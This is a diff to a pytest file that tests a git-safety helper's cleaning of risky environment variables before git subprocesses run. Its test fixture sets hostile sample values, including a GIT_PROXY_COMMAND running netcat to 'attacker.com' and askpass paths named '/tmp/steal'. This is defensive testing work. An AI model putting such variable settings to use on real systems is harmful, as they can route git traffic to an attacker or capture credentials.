@@ -9,8 +9,6 @@ import pytest
 
 from foundry_git_safety.subprocess_env import (
     ENV_ALLOWED,
-    ENV_PREFIX_STRIP,
-    ENV_VARS_TO_CLEAR,
     _GIT_LOCK_NAMES,
     _STALE_LOCK_AGE,
     build_clean_env,
@@ -56,18 +54,18 @@ class TestBuildCleanEnv:
             env = build_clean_env()
             assert "SSH_ASKPASS" not in env
 
-    def test_removes_all_env_vars_to_clear(self):
-        """Every variable listed in ENV_VARS_TO_CLEAR is absent from clean env."""
-        # Set them all in os.environ
-        env_patch = {var: "SHOULD_BE_REMOVED" for var in ENV_VARS_TO_CLEAR}
-        with patch.dict(os.environ, env_patch, clear=False):
-            env = build_clean_env()
-            for var in ENV_VARS_TO_CLEAR:
-                assert var not in env, f"{var} should have been stripped but was present"
-
-    def test_removes_all_prefix_stripped_vars(self):
-        """Variables matching ENV_PREFIX_STRIP prefixes are absent from clean env."""
+    def test_removes_dangerous_git_and_ssh_vars(self):
+        """Known dangerous GIT_* and SSH_* vars are absent from clean env."""
         dangerous = {
+            "GIT_CONFIG_PARAMETERS": "--global foo",
+            "GIT_DIR": "/malicious",
+            "GIT_WORK_TREE": "/some/tree",
+            "GIT_SSH": "ssh-wrapper",
+            "GIT_SSH_COMMAND": "ssh -o StrictHostKeyChecking=no",
+            "GIT_ASKPASS": "/tmp/steal",
+            "SSH_ASKPASS": "/tmp/steal",
+            "GIT_EDITOR": "vim",
+            "GIT_PAGER": "less",
             "GIT_PROXY_COMMAND": "nc attacker.com 443",
             "GIT_DIFF_OPTS": "--malicious",
             "SSH_AUTH_SOCK": "/tmp/ssh-malicious",
@@ -75,8 +73,8 @@ class TestBuildCleanEnv:
         }
         with patch.dict(os.environ, dangerous, clear=False):
             env = build_clean_env()
-            for key in dangerous:
-                assert key not in env, f"{key} matches a stripped prefix but was present"
+            for var in dangerous:
+                assert var not in env, f"{var} should have been excluded but was present"
 
     def test_keeps_path(self):
         """PATH is preserved from the real environment."""
